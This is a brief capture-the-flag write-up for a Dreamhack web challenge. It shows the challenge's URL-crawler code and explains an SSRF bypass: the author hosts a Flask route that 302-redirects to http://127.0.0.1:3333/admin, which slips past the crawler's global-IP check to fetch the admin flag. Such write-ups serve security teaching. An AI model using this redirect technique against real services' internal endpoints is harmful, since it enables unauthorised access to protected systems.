[link](https://dreamhack.io/wargame/challenges/274)

- The web app is simple with the crawling logic, the main logic is in this code:
```
def check_get(url):
    ip = lookup(urlparse(url).netloc.split(':')[0])
    if ip == False or ip =='0.0.0.0':
        return "Not a valid URL."
    res=requests.get(url)
    if check_global(ip) == False:
        return "Can you access my admin page~?"
    for i in res.text.split('>'):
        if 'referer' in i:
            ref_host = urlparse(res.headers.get('refer')).netloc.split(':')[0]
            if ref_host == 'localhost':
                return False
            if ref_host == '127.0.0.1':
                return False
    res=requests.get(url)
    return res.text
```

It doesn't allow us to have ip address to 0.0.0.0, also there is a check of IP:
```
def check_global(ip):
    try:
        return (ipaddress.ip_address(ip)).is_global
    except:
        return False
```
So here is the point we cannot use localhost, 127.0.0.1 or 0.0.0.0, how do we make the crawling service to crawl the /admin page and return the flag. I set up a simple Python app with a redirect route:
```
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/external-link')
def external_link():
    return redirect("http://127.0.0.1:3333/admin", code=302)

if __name__ == '__main__':
    # Chạy ứng dụng trên cổng 5000 (mặc định)
    app.run(port=5000)
```
![image](https://hackmd.io/_uploads/SkO2I03QGx.png)